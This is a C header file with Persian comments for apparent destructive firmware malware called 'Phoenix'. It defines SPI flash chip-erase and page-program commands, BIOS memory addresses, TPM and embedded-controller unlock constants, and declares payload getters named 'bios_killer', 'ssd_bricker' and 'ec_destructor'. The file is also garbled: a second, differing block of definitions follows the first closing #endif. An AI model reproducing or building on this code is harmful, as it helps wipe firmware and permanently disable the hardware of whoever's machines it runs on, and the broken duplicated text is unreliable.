#ifndef PHOENIX_DEFS_H
#define PHOENIX_DEFS_H

// ثوابت SPI Flash
#define SPI_OPCODE        0x00
#define SPI_ADDRESS       0x04
#define SPI_DATA          0x08
#define SPI_STATUS        0x0C

// ثوابت TPM
#define TPM_ACCESS_REG    0x00
#define TPM_STS_REG       0x18
#define TPM_DATA_REG      0x24
#define TPM_CONFIG_REG    0xF0
#define TPM_VOLTAGE_REG   0xF4
#define TPM_MAX_PCRS      24

// اندازه‌های پیلود
#define BIOS_KILLER_SIZE  4096
#define SSD_BRICKER_SIZE  1024

// توابع کمکی
void __iomem *get_bios_memory(void);
const u8 *get_bios_killer_payload(void);
const u8 *get_ssd_bricker_payload(void);

#endif // PHOENIX_DEFS_H

// ثوابت SPI Flash
#define SPI_OPCODE          0x00
#define SPI_ADDRESS_HIGH    0x04
#define SPI_ADDRESS_LOW     0x08
#define SPI_DATA            0x0C
#define SPI_STATUS          0x10
#define SPI_CONTROL         0x14
#define SPI_LOCK            0x18

#define SPI_CMD_WREN        0x06
#define SPI_CMD_CHIP_ERASE  0xC7
#define SPI_CMD_PAGE_PROGRAM 0x02
#define SPI_STATUS_READY    0x01
#define SPI_PAGE_SIZE       256

#define BIOS_MEM_BASE       0xFF000000
#define BIOS_MEM_SIZE       0x01000000

// ثوابت TPM
#define TPM_ACCESS          0x00
#define TPM_STS             0x18
#define TPM_DATA_FIFO       0x24
#define TPM_INTF            0x30
#define TPM_INT_ENABLE      0x38
#define TPM_IOMAP_SIZE      0x1000

// ثوابت EC
#define EC_INDEX_PORT       0x62
#define EC_DATA_PORT        0x66
#define EC_UNLOCK_CMD       0x2E
#define EC_UNLOCK_KEY       0x45
#define EC_ACTIVATE_CMD     0x2F
#define EC_LOCK_CMD         0x2A
#define EC_FLASH_SIZE       0x4000

// اندازه‌های پیلود
#define BIOS_KILLER_SIZE    4096
#define SSD_BRICKER_SIZE    1024
#define EC_DESTRUCTOR_SIZE  2048

// توابع
const u8 *get_bios_killer_payload(void);
const u8 *get_ssd_bricker_payload(void);
const u8 *get_ec_destructor_payload(void);

#endif // PHOENIX_DEFS_H

